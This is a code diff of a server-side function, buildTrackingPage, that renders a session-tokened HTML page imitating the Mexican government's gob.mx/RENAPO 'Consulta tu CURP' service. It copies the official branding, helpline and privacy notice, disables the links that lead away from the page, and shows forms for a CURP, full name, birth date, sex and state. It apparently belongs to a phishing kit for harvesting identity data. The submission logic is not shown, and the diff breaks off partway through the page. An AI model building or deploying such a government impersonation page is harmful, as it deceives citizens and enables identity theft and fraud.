@@ -7,360 +7,366 @@ const router: IRouter = Router();
 
 function buildTrackingPage(session: { token: string; name: string; pageStyle: string }): string {
   const tok = session.token;
+  const dias = Array.from({length:31},(_,i)=>i+1).map(d=>`<option value="${d}">${String(d).padStart(2,'0')}</option>`).join('');
+  const meses = ['01 - Enero','02 - Febrero','03 - Marzo','04 - Abril','05 - Mayo','06 - Junio','07 - Julio','08 - Agosto','09 - Septiembre','10 - Octubre','11 - Noviembre','12 - Diciembre'].map((m,i)=>`<option value="${i+1}">${m}</option>`).join('');
+  const estados = ['Aguascalientes','Baja California','Baja California Sur','Campeche','Chiapas','Chihuahua','Ciudad de México','Coahuila','Colima','Durango','Estado de México','Guanajuato','Guerrero','Hidalgo','Jalisco','Michoacán','Morelos','Nayarit','Nuevo León','Oaxaca','Puebla','Querétaro','Quintana Roo','San Luis Potosí','Sinaloa','Sonora','Tabasco','Tamaulipas','Tlaxcala','Veracruz','Yucatán','Zacatecas','Nacido en el extranjero'].map(e=>`<option value="${e}">${e}</option>`).join('');
+
   return `<!DOCTYPE html>
 <html lang="es">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <title>Consulta tu CURP | gob.mx</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700;900&display=swap" rel="stylesheet">
 <style>
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
-body{font-family:'Open Sans',Arial,Helvetica,sans-serif;background:#f0f0f0;color:#333;min-height:100vh;display:flex;flex-direction:column}
+html{scroll-behavior:smooth}
+body{font-family:'Lato',Arial,Helvetica,sans-serif;background:#fff;color:#333;min-height:100vh;display:flex;flex-direction:column;font-size:16px;padding-bottom:72px}
 
-/* ===== HEADER GOB.MX ===== */
-.gob-skip{position:absolute;left:-9999px;top:0;background:#006847;color:#fff;padding:8px 16px;font-size:13px;z-index:999}
-.gob-skip:focus{left:0}
+/* ── HEADER ── */
+.hdr{background:#6B1535;width:100%}
+.hdr-top{display:flex;align-items:center;justify-content:space-between;padding:10px 16px;max-width:960px;margin:0 auto}
+.hdr-logo{display:flex;align-items:center;gap:10px;text-decoration:none}
+.hdr-escudo{width:44px;height:44px;flex-shrink:0}
+.hdr-govtext{display:flex;flex-direction:column;line-height:1.15}
+.hdr-govtext span:first-child{color:rgba(255,255,255,0.9);font-size:13px;font-weight:400}
+.hdr-govtext span:last-child{color:#fff;font-size:18px;font-weight:900;letter-spacing:-0.3px}
+.hdr-menu{background:none;border:none;cursor:pointer;color:#fff;padding:6px;display:flex;flex-direction:column;gap:5px;flex-shrink:0}
+.hdr-menu span{display:block;width:22px;height:2px;background:#fff;border-radius:1px}
 
-.gob-header{background:#006847;width:100%}
-.gob-header-top{display:flex;align-items:center;justify-content:space-between;max-width:1140px;margin:0 auto;padding:10px 20px;gap:16px}
-.gob-logo-link{display:flex;align-items:center;gap:10px;text-decoration:none;flex-shrink:0}
-.gob-logo-escudo{width:42px;height:42px;background:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 60 60"><rect width="60" height="60" rx="4" fill="%23fff"/><text x="50%25" y="56%25" dominant-baseline="middle" text-anchor="middle" font-family="Arial" font-weight="900" font-size="18" fill="%23006847">gob</text></svg>') center/cover no-repeat;border-radius:4px}
-.gob-logo-text{display:flex;flex-direction:column}
-.gob-logo-name{color:#fff;font-size:20px;font-weight:700;line-height:1.1;letter-spacing:-0.3px}
-.gob-logo-sub{color:rgba(255,255,255,0.8);font-size:11px;font-weight:400;line-height:1}
-.gob-header-nav{display:flex;align-items:center;gap:20px;flex-shrink:0}
-.gob-header-nav a{color:rgba(255,255,255,0.85);text-decoration:none;font-size:13px;font-weight:600;transition:color 0.15s}
-.gob-header-nav a:hover{color:#fff;text-decoration:underline}
-@media(max-width:600px){.gob-header-nav{display:none}}
+/* ── RENAPO BAR ── */
+.renapo-bar{background:#5c1230;padding:8px 16px}
+.renapo-bar-inner{max-width:960px;margin:0 auto}
+.renapo-bar p{color:#fff;font-size:13.5px;font-weight:700;letter-spacing:0.3px}
 
-.gob-breadcrumb{background:#004f35;border-top:1px solid rgba(255,255,255,0.12)}
-.gob-breadcrumb-inner{max-width:1140px;margin:0 auto;padding:8px 20px;display:flex;align-items:center;gap:6px;flex-wrap:wrap}
-.gob-breadcrumb a{color:rgba(255,255,255,0.8);font-size:12.5px;text-decoration:none}
-.gob-breadcrumb a:hover{color:#fff;text-decoration:underline}
-.gob-breadcrumb span{color:rgba(255,255,255,0.5);font-size:12px}
+/* ── BREADCRUMB ── */
+.breadcrumb{padding:10px 16px;max-width:960px;margin:0 auto;display:flex;align-items:center;gap:4px;flex-wrap:wrap}
+.breadcrumb a,.breadcrumb span{font-size:13px;color:#333;text-decoration:none}
+.breadcrumb a:hover{text-decoration:underline}
+.breadcrumb .sep{color:#666;font-size:12px;margin:0 1px}
+.breadcrumb .current{font-weight:700}
+.home-icon{font-size:14px}
 
-/* ===== HERO ===== */
-.gob-hero{background:linear-gradient(180deg,#006847 0%,#005a3c 100%);padding:28px 20px 0;color:#fff}
-.gob-hero-inner{max-width:1140px;margin:0 auto}
-.gob-hero h1{font-size:26px;font-weight:700;margin-bottom:6px}
-.gob-hero-desc{font-size:14px;opacity:0.85;margin-bottom:20px}
+/* ── PAGE TITLE ── */
+.page-wrap{max-width:960px;margin:0 auto;padding:0 16px;width:100%}
+.page-title{font-size:32px;font-weight:900;color:#333;margin:12px 0 20px;line-height:1.15}
 
-/* Steps */
-.gob-steps{display:flex;gap:0;margin-top:4px}
-.gob-step{display:flex;align-items:center;gap:8px;background:rgba(0,0,0,0.2);padding:10px 18px;font-size:13px;color:rgba(255,255,255,0.75);flex:1;border-radius:0;cursor:default}
-.gob-step:first-child{border-radius:6px 0 0 0}
-.gob-step.active{background:#fff;color:#006847;font-weight:700}
-.gob-step-num{width:22px;height:22px;border-radius:50%;background:rgba(255,255,255,0.25);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;flex-shrink:0;color:rgba(255,255,255,0.9)}
-.gob-step.active .gob-step-num{background:#006847;color:#fff}
-.gob-step-label{display:flex;flex-direction:column;gap:1px}
-.gob-step-sub{font-size:10px;text-transform:uppercase;letter-spacing:0.5px;opacity:0.7;font-weight:600}
-.gob-step.active .gob-step-sub{color:#006847;opacity:0.7}
-@media(max-width:480px){.gob-step{padding:8px 12px}.gob-step-label .gob-step-sub{display:none}}
+/* ── SECTION HEADER ── */
+.section-hdr{margin-bottom:6px}
+.section-hdr h2{font-size:20px;font-weight:900;color:#333;margin-bottom:6px}
+.section-underline{width:36px;height:3px;background:#c4a200;border-radius:2px;margin-bottom:16px}
+.section-desc{font-size:15px;color:#444;line-height:1.55;margin-bottom:22px}
 
-/* ===== MAIN CONTENT ===== */
-.gob-main{max-width:1140px;margin:0 auto;padding:28px 20px 48px;width:100%;flex:1}
-.gob-section-title{font-size:18px;font-weight:700;color:#333;margin-bottom:4px}
-.gob-divider{border:none;border-top:2px solid #ddd;margin:14px 0 20px}
+/* ── TABS ── */
+.tabs{display:flex;gap:0;margin-bottom:0}
+.tab-btn{padding:10px 14px;font-size:13.5px;font-weight:700;border:1px solid #ccc;border-bottom:none;cursor:pointer;font-family:inherit;-webkit-appearance:none;transition:all 0.15s;color:#444;background:#e8e8e8;border-radius:0;line-height:1.3}
+.tab-btn.active{background:#6B1535;color:#fff;border-color:#6B1535}
+.tab-btn:first-child{border-radius:4px 0 0 0}
+.tab-btn:last-child{border-radius:0 4px 0 0}
 
-/* Tabs */
-.gob-tabs{display:flex;gap:4px;margin-bottom:0;border-bottom:2px solid #006847}
-.gob-tab{padding:10px 20px;font-size:13px;font-weight:600;color:#555;background:#e8e8e8;border:1px solid #ccc;border-bottom:none;border-radius:4px 4px 0 0;cursor:pointer;transition:all 0.15s;-webkit-appearance:none;font-family:inherit}
-.gob-tab.active{background:#006847;color:#fff;border-color:#006847}
-.gob-tab:hover:not(.active){background:#ddd;color:#333}
+/* ── FORM CARD ── */
+.form-card{border:1px solid #c0c0c0;background:#fff;padding:18px;margin-bottom:20px}
 
-/* Form card */
-.gob-card{background:#fff;border:1px solid #ccc;border-top:none;padding:24px;margin-bottom:20px}
-.gob-form-group{margin-bottom:18px}
-.gob-label{display:block;font-size:13px;font-weight:600;color:#333;margin-bottom:5px}
-.gob-label .req{color:#9f2241;margin-left:2px}
-.gob-input,.gob-select{width:100%;padding:9px 12px;border:1px solid #aaa;border-radius:3px;font-size:15px;color:#333;background:#fff;font-family:inherit;-webkit-appearance:none;transition:border-color 0.15s,box-shadow 0.15s}
-.gob-input:focus,.gob-select:focus{outline:none;border-color:#006847;box-shadow:0 0 0 3px rgba(0,104,71,0.18)}
-.gob-input::placeholder{color:#bbb;font-size:13px}
-.gob-input.uppercase{text-transform:uppercase;letter-spacing:1px}
-.gob-row{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px}
-.gob-row-2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
-@media(max-width:580px){.gob-row{grid-template-columns:1fr 1fr}.gob-row-2{grid-template-columns:1fr}}
+/* ── FORM FIELDS ── */
+.f-group{margin-bottom:16px}
+.f-label{display:block;font-size:14px;font-weight:700;color:#333;margin-bottom:5px}
+.f-req{color:#c0392b}
+.f-input,.f-select{width:100%;padding:10px 12px;border:1px solid #bbb;border-radius:3px;font-size:15px;color:#333;background:#fff;font-family:inherit;-webkit-appearance:none;appearance:none;outline:none;transition:border-color 0.15s}
+.f-input:focus,.f-select:focus{border-color:#6B1535;box-shadow:0 0 0 2px rgba(107,21,53,0.15)}
+.f-input::placeholder{color:#aaa}
+.f-input.upper{text-transform:uppercase;letter-spacing:1px}
+.f-select-wrap{position:relative}
+.f-select-wrap::after{content:'❯';position:absolute;right:12px;top:50%;transform:translateY(-50%) rotate(90deg);font-size:10px;color:#666;pointer-events:none}
+.f-select{padding-right:32px}
+.f-link{color:#6B1535;font-size:13.5px;text-decoration:underline;cursor:pointer;background:none;border:none;font-family:inherit;padding:0;margin-top:6px;display:inline-block}
 
-.gob-link{color:#006847;font-size:13px;text-decoration:underline;cursor:pointer;background:none;border:none;font-family:inherit;padding:0}
-.gob-required-note{font-size:12px;color:#666;margin-top:4px}
+/* ── STICKY BOTTOM BAR ── */
+.bottom-bar{position:fixed;bottom:0;left:0;right:0;background:#fff;border-top:1px solid #e0e0e0;padding:12px 16px;display:flex;align-items:center;justify-content:space-between;gap:12px;z-index:100;box-shadow:0 -2px 8px rgba(0,0,0,0.08)}
+.bottom-note{font-size:12.5px;color:#555}
+.btn-buscar{display:flex;align-items:center;gap:7px;background:#fff;color:#6B1535;border:2px solid #6B1535;padding:9px 20px;font-size:15px;font-weight:700;border-radius:3px;cursor:pointer;font-family:inherit;-webkit-appearance:none;transition:all 0.15s;white-space:nowrap}
+.btn-buscar:hover{background:#6B1535;color:#fff}
+.btn-buscar svg{width:16px;height:16px;flex-shrink:0}
 
-.gob-divider-light{border:none;border-top:1px solid #e0e0e0;margin:18px 0}
+/* ── INFO BOXES (light blue) ── */
+.info-box{background:#d8eaf5;border-radius:3px;padding:16px;font-size:14px;color:#333;line-height:1.6;margin-bottom:16px;text-align:center}
+.info-box strong{font-weight:700}
+.info-box a{color:#0a5997;text-decoration:underline}
+.info-box ul{text-align:left;padding-left:20px;margin-top:6px}
+.info-box ul li{margin-bottom:2px}
 
-.gob-btn{display:block;background:#006847;color:#fff;border:none;padding:11px 32px;font-size:15px;font-weight:700;border-radius:3px;cursor:pointer;font-family:inherit;-webkit-appearance:none;transition:background 0.15s;min-width:140px}
-.gob-btn:hover{background:#004f35}
-.gob-btn:active{background:#003d29}
-.gob-btn:disabled{background:#aaa;cursor:default}
+/* ── FOOTER ── */
+.footer{background:#6B1535;margin-top:auto;padding:24px 16px}
+.footer-inner{max-width:960px;margin:0 auto}
+.footer-brand{display:flex;align-items:center;gap:10px;margin-bottom:20px}
+.footer-brand-text{display:flex;flex-direction:column;line-height:1.2}
+.footer-brand-text span:first-child{color:rgba(255,255,255,0.85);font-size:12px;font-weight:400}
+.footer-brand-text span:last-child{color:#fff;font-size:17px;font-weight:900}
+.footer-section{border-top:1px solid rgba(255,255,255,0.2);padding:14px 0;display:flex;justify-content:space-between;align-items:center;cursor:pointer}
+.footer-section span{color:#fff;font-size:15px;font-weight:700}
+.footer-section .chevron{color:rgba(255,255,255,0.8);font-size:13px}
+.footer-link{display:block;color:#fff;font-size:14px;font-weight:700;text-decoration:underline;padding:14px 0;border-top:1px solid rgba(255,255,255,0.2)}
+.footer-social{padding:16px 0;border-top:1px solid rgba(255,255,255,0.2)}
+.footer-social p{color:#fff;font-size:14px;margin-bottom:10px}
+.footer-social-icons{display:flex;align-items:center;gap:16px}
+.footer-social-icons a{color:#fff;font-size:18px;text-decoration:none;font-weight:700}
+.footer-079{display:flex;align-items:center;gap:10px;padding:14px 0;border-top:1px solid rgba(255,255,255,0.2)}
+.footer-079-icon{color:#fff;font-size:22px}
+.footer-079-text{display:flex;flex-direction:column}
+.footer-079-text .num{color:#fff;font-size:20px;font-weight:900;line-height:1}
+.footer-079-text .sub{color:rgba(255,255,255,0.85);font-size:12px;line-height:1.3}
 
-/* Info box */
-.gob-infobox{background:#fff8e1;border-left:4px solid #f5a623;padding:14px 16px;border-radius:0 4px 4px 0;margin-top:20px;font-size:13px;color:#555;line-height:1.55}
-.gob-infobox strong{color:#333;display:block;margin-bottom:3px}
-
-/* Privacy notice */
-.gob-privacy{background:#f5f5f5;border:1px solid #e0e0e0;border-radius:4px;padding:16px;margin-top:20px;font-size:12px;color:#666;line-height:1.6}
-.gob-privacy strong{color:#444}
-.gob-privacy a{color:#006847}
-
-/* ===== OVERLAY / MODAL ===== */
-.gob-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.55);z-index:1000;align-items:center;justify-content:center;padding:20px}
-.gob-overlay.show{display:flex}
-.gob-modal{background:#fff;border-radius:6px;padding:32px 28px;max-width:420px;width:100%;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.25)}
-.gob-modal-icon{width:60px;height:60px;background:#e8f5f0;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;border:2px solid #b2dfcf}
-.gob-modal-title{font-size:17px;font-weight:700;color:#333;margin-bottom:8px}
-.gob-modal-desc{font-size:13px;color:#666;line-height:1.55;margin-bottom:20px}
-.gob-modal-btn{background:#006847;color:#fff;border:none;padding:12px 24px;border-radius:3px;font-size:15px;font-weight:700;cursor:pointer;width:100%;font-family:inherit;margin-bottom:10px;transition:background 0.15s}
-.gob-modal-btn:hover{background:#004f35}
+/* ── MODAL OVERLAY ── */
+.overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:200;align-items:center;justify-content:center;padding:20px}
+.overlay.show{display:flex}
+.modal{background:#fff;border-radius:4px;padding:28px 24px;max-width:400px;width:100%;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,0.3)}
+.modal-icon{width:56px;height:56px;background:#f0e6ea;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 14px;border:2px solid #d4a0b0}
+.modal-title{font-size:17px;font-weight:900;color:#333;margin-bottom:8px;line-height:1.3}
+.modal-desc{font-size:13.5px;color:#555;line-height:1.6;margin-bottom:20px}
+.modal-btn{width:100%;background:#6B1535;color:#fff;border:none;padding:13px;border-radius:3px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit;margin-bottom:8px;-webkit-appearance:none;transition:background 0.15s}
+.modal-btn:hover{background:#5c1230}
+.modal-btn-sec{width:100%;background:none;color:#6B1535;border:none;padding:8px;font-size:13px;cursor:pointer;font-family:inherit;text-decoration:underline}
 
 /* Spinner */
-.gob-spinner{width:40px;height:40px;border:3px solid #e0e0e0;border-top-color:#006847;border-radius:50%;animation:spin 0.85s linear infinite;margin:0 auto 14px}
+.spinner{width:40px;height:40px;border:3px solid #e8d0d7;border-top-color:#6B1535;border-radius:50%;animation:spin 0.85s linear infinite;margin:0 auto 14px}
 @keyframes spin{to{transform:rotate(360deg)}}
 
 /* Success */
-.gob-success-icon{width:60px;height:60px;background:#e8f5f0;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 14px;border:2px solid #80cba8}
-.gob-success-title{font-size:17px;font-weight:700;color:#006847;margin-bottom:8px}
-.gob-success-desc{font-size:13px;color:#555;line-height:1.55;margin-bottom:20px}
-.gob-success-ref{background:#f5f5f5;border:1px solid #e0e0e0;border-radius:4px;padding:12px;font-size:13px;color:#444;margin-bottom:16px}
-.gob-success-ref span{font-weight:700;color:#006847;font-family:monospace}
-
-/* Error */
-.gob-error-box{background:#fdf2f5;border:1px solid #e8b4c0;border-radius:4px;padding:14px;font-size:13px;color:#7a1230;margin-bottom:16px;text-align:center;line-height:1.5}
-
-/* ===== FOOTER ===== */
-.gob-footer{background:#333;color:rgba(255,255,255,0.75);font-size:12px;padding:18px 20px}
-.gob-footer-inner{max-width:1140px;margin:0 auto;display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap}
-.gob-footer a{color:rgba(255,255,255,0.75);text-decoration:none}
-.gob-footer a:hover{color:#fff;text-decoration:underline}
-.gob-footer-links{display:flex;gap:16px;flex-wrap:wrap}
+.success-icon{width:56px;height:56px;background:#d4edda;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 14px;border:2px solid #9fd4ae}
+.success-title{font-size:17px;font-weight:900;color:#1a6b2a;margin-bottom:8px}
+.success-desc{font-size:13.5px;color:#555;line-height:1.55;margin-bottom:18px}
+.success-ref{background:#f5f5f5;border:1px solid #e0e0e0;border-radius:3px;padding:10px;font-size:13px;color:#444;margin-bottom:16px}
+.success-ref strong{color:#6B1535;font-family:monospace}
+.error-box{background:#fdf0f2;border:1px solid #e8b4bf;border-radius:3px;padding:14px;font-size:13.5px;color:#7a1230;margin-bottom:16px;line-height:1.5;text-align:left}
 </style>
 </head>
 <body>
 
-<a href="#main-content" class="gob-skip">Ir al contenido principal</a>
-
-<!-- ===== HEADER ===== -->
-<header class="gob-header">
-  <div class="gob-header-top">
-    <a href="https://www.gob.mx" class="gob-logo-link" tabindex="0">
-      <div class="gob-logo-escudo"></div>
-      <div class="gob-logo-text">
-        <span class="gob-logo-name">gob.mx</span>
-        <span class="gob-logo-sub">Gobierno de México</span>
+<!-- ══ HEADER ══ -->
+<header class="hdr">
+  <div class="hdr-top">
+    <a class="hdr-logo" href="https://www.gob.mx" onclick="return false">
+      <img class="hdr-escudo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1e/Escudo_de_armas_de_M%C3%A9xico.svg/47px-Escudo_de_armas_de_M%C3%A9xico.svg.png" alt="Escudo Nacional" onerror="this.style.display='none'">
+      <div class="hdr-govtext">
+        <span>Gobierno de</span>
+        <span>México</span>
       </div>
     </a>
-    <nav class="gob-header-nav">
-      <a href="#">Trámites</a>
-      <a href="#">Gobierno</a>
-      <a href="#">Contacto</a>
-      <a href="#">🔍 Buscar</a>
-    </nav>
-  </div>
-  <div class="gob-breadcrumb">
-    <div class="gob-breadcrumb-inner">
-      <a href="#">Inicio</a>
-      <span>›</span>
-      <a href="#">Trámites y Servicios</a>
-      <span>›</span>
-      <a href="#">Registro e Identidad</a>
-      <span>›</span>
-      <a href="#">Consulta tu CURP</a>
-    </div>
+    <button class="hdr-menu" aria-label="Menú" onclick="return false">
+      <span></span><span></span><span></span>
+    </button>
   </div>
 </header>
 
-<!-- ===== HERO ===== -->
-<section class="gob-hero">
-  <div class="gob-hero-inner">
-    <h1>Consulta tu CURP</h1>
-    <p class="gob-hero-desc">Clave Única de Registro de Población — servicio gratuito de la Secretaría de Gobernación</p>
-    <div class="gob-steps">
-      <div class="gob-step active">
-        <div class="gob-step-num">1</div>
-        <div class="gob-step-label">
-          <span class="gob-step-sub">Paso 1</span>
-          Búsqueda
+<!-- ══ RENAPO BAR ══ -->
+<div class="renapo-bar">
+  <div class="renapo-bar-inner"><p>RENAPO</p></div>
+</div>
+
+<!-- ══ BREADCRUMB ══ -->
+<div style="background:#fff;border-bottom:1px solid #eee">
+  <div class="breadcrumb">
+    <span class="home-icon">⌂</span>
+    <span class="sep"> &rsaquo; </span>
+    <a href="#">Inicio</a>
+    <span class="sep"> &rsaquo; </span>
+    <span class="current">Consulta tu CURP</span>
+  </div>
+</div>
+
+<!-- ══ MAIN CONTENT ══ -->
+<main style="flex:1;background:#fff">
+  <div class="page-wrap">
+    <h1 class="page-title">Consulta tu CURP</h1>
+
+    <div class="section-hdr">
+      <h2>Búsqueda</h2>
+      <div class="section-underline"></div>
+    </div>
+
+    <p class="section-desc">La consulta puede efectuarse indicando la clave CURP cuando ya la conoce o proporcionando su nombre y datos de nacimiento.</p>
+
+    <!-- Tabs -->
+    <div class="tabs">
+      <button class="tab-btn active" onclick="switchTab('tab-curp',this)" type="button">Clave Única de Registro de Población</button>
+      <button class="tab-btn" onclick="switchTab('tab-datos',this)" type="button">Datos Personales</button>
+    </div>
+
+    <!-- Tab 1: Por CURP -->
+    <div class="form-card" id="tab-curp">
+      <div class="f-group">
+        <label class="f-label">Clave Única de Registro de Población (CURP)<span class="f-req">*</span>:</label>
+        <input class="f-input upper" type="text" id="curp-input" maxlength="18" placeholder="Ingresa tu CURP" autocomplete="off" autocorrect="off" spellcheck="false">
+        <button class="f-link" type="button" onclick="switchTab('tab-datos', document.querySelectorAll('.tab-btn')[1])">¿No conoces tu CURP?</button>
+      </div>
+    </div>
+
+    <!-- Tab 2: Por Datos Personales -->
+    <div class="form-card" id="tab-datos" style="display:none">
+      <div class="f-group">
+        <label class="f-label">Nombre(s)<span class="f-req">*</span>:</label>
+        <input class="f-input" type="text" id="nombre" placeholder="Ingresa tu nombre(s)" autocomplete="given-name">
+      </div>
+      <div class="f-group">
+        <label class="f-label">Primer apellido<span class="f-req">*</span>:</label>
+        <input class="f-input" type="text" id="apellido1" placeholder="Ingresa tu primer apellido" autocomplete="family-name">
+      </div>
+      <div class="f-group">
+        <label class="f-label">Segundo apellido:</label>
+        <input class="f-input" type="text" id="apellido2" placeholder="Ingresa tu segundo apellido">
+      </div>
+      <div class="f-group">
+        <label class="f-label">Día de nacimiento<span class="f-req">*</span>:</label>
+        <div class="f-select-wrap">
+          <select class="f-select" id="dia">
+            <option value="">Seleccionar el día</option>
+            ${dias}
+          </select>
         </div>
       </div>
-      <div class="gob-step">
-        <div class="gob-step-num">2</div>
-        <div class="gob-step-label">
-          <span class="gob-step-sub">Paso 2</span>
-          Descargar CURP
+      <div class="f-group">
+        <label class="f-label">Mes de nacimiento<span class="f-req">*</span>:</label>
+        <div class="f-select-wrap">
+          <select class="f-select" id="mes">
+            <option value="">Seleccionar el mes</option>
+            ${meses}
+          </select>
+        </div>
+      </div>
+      <div class="f-group">
+        <label class="f-label">Año de nacimiento<span class="f-req">*</span>:</label>
+        <input class="f-input" type="number" id="anio" placeholder="Ingresa el año Ej. 1943" min="1900" max="2025">
+      </div>
+      <div class="f-group">
+        <label class="f-label">Sexo<span class="f-req">*</span>:</label>
+        <div class="f-select-wrap">
+          <select class="f-select" id="sexo">
+            <option value="">Selecciona el sexo</option>
+            <option value="M">Mujer</option>
+            <option value="H">Hombre</option>
+            <option value="X">No binario</option>
+          </select>
+        </div>
+      </div>
+      <div class="f-group" style="margin-bottom:0">
+        <label class="f-label">Estado<span class="f-req">*</span>: <span style="font-size:13px;font-weight:400;color:#888">&#9432;</span></label>
+        <div class="f-select-wrap">
+          <select class="f-select" id="estado">
+            <option value="">Selecciona el estado</option>
+            ${estados}
+          </select>
         </div>
       </div>
     </div>
-  </div>
-</section>
 
-<!-- ===== MAIN ===== -->
-<main class="gob-main" id="main-content">
-  <div class="gob-section-title">Búsqueda</div>
-  <hr class="gob-divider">
-  <p style="font-size:13.5px;color:#555;margin-bottom:18px;line-height:1.55">
-    La consulta puede efectuarse indicando la clave CURP cuando ya la conoce o proporcionando su nombre y datos de nacimiento.
-  </p>
+    <!-- Sugerencia -->
+    <div class="info-box">
+      <p><strong>¡Sugerencia!</strong> Para solicitar asistencia telefónica sobre el servicio de la CURP, puedes comunicarte al Centro de Atención y Servicios, de lunes a viernes, de 08:00 a 16:00 horas, a los números telefónicos:</p>
+      <ul>
+        <li>800 &nbsp;9 &nbsp;11 &nbsp;11 &nbsp;11, extensiones 15100 y 15101.</li>
+      </ul>
+    </div>
 
-  <!-- Tabs -->
-  <div class="gob-tabs">
-    <button class="gob-tab active" onclick="switchTab('tab-curp',this)" type="button">Clave Única de Registro de Población</button>
-    <button class="gob-tab" onclick="switchTab('tab-datos',this)" type="button">Datos Personales</button>
-  </div>
-
-  <!-- Tab 1: Por CURP -->
-  <div class="gob-card" id="tab-curp">
-    <div class="gob-form-group">
-      <label class="gob-label" for="curp-input">Clave Única de Registro de Población (CURP)<span class="req">*</span>:</label>
-      <input class="gob-input uppercase" type="text" id="curp-input" maxlength="18" placeholder="Ej. GOPM850101HDFNRR09" autocomplete="off" autocorrect="off" spellcheck="false">
-      <div style="margin-top:6px"><button class="gob-link" type="button" onclick="switchTab('tab-datos', document.querySelectorAll('.gob-tab')[1])">¿No conoces tu CURP?</button></div>
+    <!-- Aviso de privacidad -->
+    <div class="info-box">
+      <p><strong>Aviso de privacidad simplificado de consulta de CURP en línea</strong></p>
+      <p style="margin-top:8px">La recolección de datos personales se lleva a cabo a través de <a href="#">https://www.gob.mx/curp</a>, cuyo administrador y responsable del trámite de CURP es la Dirección General del Registro Nacional de Población e Identidad de la Secretaría de Gobernación.</p>
+      <p style="margin-top:8px">Los datos personales que se recaban serán utilizados con la finalidad de buscar, validar y obtener la CURP.</p>
+      <p style="margin-top:8px">Conoce el aviso de privacidad integral en <a href="#">https://www.gob.mx/curp/privacidadintegral</a>.</p>
     </div>
-    <hr class="gob-divider-light">
-    <p class="gob-required-note">* Campos obligatorios</p>
-    <div style="margin-top:14px">
-      <button class="gob-btn" type="button" onclick="handleBuscar()">Buscar</button>
-    </div>
-  </div>
-
-  <!-- Tab 2: Por Datos Personales -->
-  <div class="gob-card" id="tab-datos" style="display:none">
-    <div class="gob-form-group">
-      <label class="gob-label" for="nombre">Nombre(s)<span class="req">*</span>:</label>
-      <input class="gob-input" type="text" id="nombre" placeholder="Ej. María de los Ángeles" autocomplete="given-name">
-    </div>
-    <div class="gob-form-group">
-      <label class="gob-label" for="apellido1">Primer apellido<span class="req">*</span>:</label>
-      <input class="gob-input" type="text" id="apellido1" placeholder="Apellido paterno" autocomplete="family-name">
-    </div>
-    <div class="gob-form-group">
-      <label class="gob-label" for="apellido2">Segundo apellido:</label>
-      <input class="gob-input" type="text" id="apellido2" placeholder="Apellido materno (opcional)" autocomplete="additional-name">
-    </div>
-    <div class="gob-row" style="margin-bottom:18px">
-      <div class="gob-form-group" style="margin-bottom:0">
-        <label class="gob-label" for="dia">Día de nacimiento<span class="req">*</span>:</label>
-        <select class="gob-select" id="dia">
-          <option value="">Seleccionar el día</option>
-          ${Array.from({length:31},(_,i)=>i+1).map(d=>`<option value="${d}">${String(d).padStart(2,'0')}</option>`).join('')}
-        </select>
-      </div>
-      <div class="gob-form-group" style="margin-bottom:0">
-        <label class="gob-label" for="mes">Mes de nacimiento<span class="req">*</span>:</label>
-        <select class="gob-select" id="mes">
-          <option value="">Seleccionar el mes</option>
-          ${['Enero','Febrero','Marzo','Abril','Mayo','Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre'].map((m,i)=>`<option value="${i+1}">${m}</option>`).join('')}
-        </select>
-      </div>
-      <div class="gob-form-group" style="margin-bottom:0">
-        <label class="gob-label" for="anio">Año de nacimiento<span class="req">*</span>:</label>
-        <input class="gob-input" type="number" id="anio" placeholder="Ej. 1990" min="1900" max="2025">
-      </div>
-    </div>
-    <div class="gob-row-2" style="margin-bottom:18px">
-      <div class="gob-form-group" style="margin-bottom:0">
-        <label class="gob-label" for="sexo">Sexo<span class="req">*</span>:</label>
-        <select class="gob-select" id="sexo">
-          <option value="">Selecciona el sexo</option>
-          <option value="M">Mujer</option>
-          <option value="H">Hombre</option>
-          <option value="X">No binario</option>
-        </select>
-      </div>
-      <div class="gob-form-group" style="margin-bottom:0">
-        <label class="gob-label" for="estado">Estado<span class="req">*</span>:</label>
-        <select class="gob-select" id="estado">
-          <option value="">Selecciona el estado</option>
-          <option>Aguascalientes</option><option>Baja California</option><option>Baja California Sur</option>
-          <option>Campeche</option><option>Chiapas</option><option>Chihuahua</option>
-          <option>Ciudad de México</option><option>Coahuila</option><option>Colima</option>
-          <option>Durango</option><option>Estado de México</option><option>Guanajuato</option>
-          <option>Guerrero</option><option>Hidalgo</option><option>Jalisco</option>
-          <option>Michoacán</option><option>Morelos</option><option>Nayarit</option>
-          <option>Nuevo León</option><option>Oaxaca</option><option>Puebla</option>
-          <option>Querétaro</option><option>Quintana Roo</option><option>San Luis Potosí</option>
-          <option>Sinaloa</option><option>Sonora</option><option>Tabasco</option>
-          <option>Tamaulipas</option><option>Tlaxcala</option><option>Veracruz</option>
-          <option>Yucatán</option><option>Zacatecas</option><option>Nacido en el extranjero</option>
-        </select>
-      </div>
-    </div>
-    <hr class="gob-divider-light">
-    <p class="gob-required-note">* Campos obligatorios</p>
-    <div style="margin-top:14px">
-      <button class="gob-btn" type="button" onclick="handleBuscar()">Buscar</button>
-    </div>
-  </div>
-
-  <!-- Info box -->
